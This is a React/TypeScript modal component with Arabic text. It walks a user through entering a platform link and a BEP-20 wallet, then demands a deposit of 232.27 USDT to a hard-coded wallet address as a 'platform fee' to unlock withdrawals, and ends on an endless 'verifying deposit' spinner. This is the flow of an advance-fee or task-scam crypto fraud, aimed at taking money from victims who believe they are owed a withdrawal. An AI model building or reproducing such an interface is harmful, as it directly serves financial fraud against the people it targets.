
import React, { useState } from 'react';

interface ModalDialogProps {
  username: string;
  onClose: () => void;
}

const ModalDialog: React.FC<ModalDialogProps> = ({ username, onClose }) => {
  const [step, setStep] = useState(1);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const nextStep = () => setStep(prev => prev + 1);

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/40 backdrop-blur-[1px]">
      <div className="bg-white rounded-2xl w-full max-w-[340px] p-6 shadow-2xl border border-gray-100 animate-in fade-in zoom-in duration-300 flex flex-col items-center text-center">
        
        {step === 1 && (
          <div className="space-y-4">
            <h3 className="text-lg font-bold text-gray-800 dir-rtl">
              أهلاً بك {username}
            </h3>
            <p className="text-sm text-gray-600 leading-relaxed dir-rtl">
              تم حل أمر المهام، اضغط التالي وقم بوضع رابط المنصة mini pro لقسم الإيداع حصراً.
            </p>
            <div className="pt-2">
              <input 
                type="text" 
                placeholder="رابط المنصة mini pro"
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#9B4A4E] text-right"
                value={platformLink}
                onChange={(e) => setPlatformLink(e.target.value)}
              />
            </div>
            <button 
              onClick={nextStep}
              className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold py-3 rounded-xl active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-4 w-full">
            <h3 className="text-lg font-bold text-gray-800 dir-rtl">
              إدخال المحفظة
            </h3>
            <p className="text-sm text-gray-600 leading-relaxed dir-rtl">
              يرجى وضع رابط محفظة BEP-20 الخاصة بك.
            </p>
            <div className="pt-2">
              <input 
                type="text" 
                placeholder="رابط محفظة BEP-20"
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#9B4A4E] text-right"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
              />
            </div>
            <button 
              onClick={nextStep}
              className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold py-3 rounded-xl active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4">
            <h3 className="text-lg font-bold text-gray-800 dir-rtl">
              أهلاً بك {username}
            </h3>
            <p className="text-sm text-gray-600 leading-relaxed text-right dir-rtl">
              بقي أمر إيداع مبلغ <span className="font-bold text-red-600">232.27</span> عملة <span className="font-bold">USDT BEP-20</span> لفتح قناة السحب.
            </p>
            <p className="text-[12px] text-gray-500 leading-relaxed text-right dir-rtl italic">
              هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro. يمكن السحب فور إتمام العملية.
            </p>
            <div className="bg-gray-50 p-3 rounded-lg border border-dashed border-gray-300 select-all cursor-pointer">
              <p className="text-[11px] font-mono break-all text-gray-700">
                0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
              </p>
            </div>
            <button 
              onClick={nextStep}
              className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold py-3 rounded-xl active:scale-95 transition-transform"
            >
              تم الايداع
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="space-y-6 py-4">
            <div className="flex justify-center">
              <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p className="text-base font-bold text-gray-800 dir-rtl">
              الرجاء الانتظار للتأكد من عملية الإيداع...
            </p>
          </div>
        )}

      </div>
      
      <style>{`
        .dir-rtl {
          direction: rtl;
        }
      `}</style>
    </div>
  );
};

export default ModalDialog;
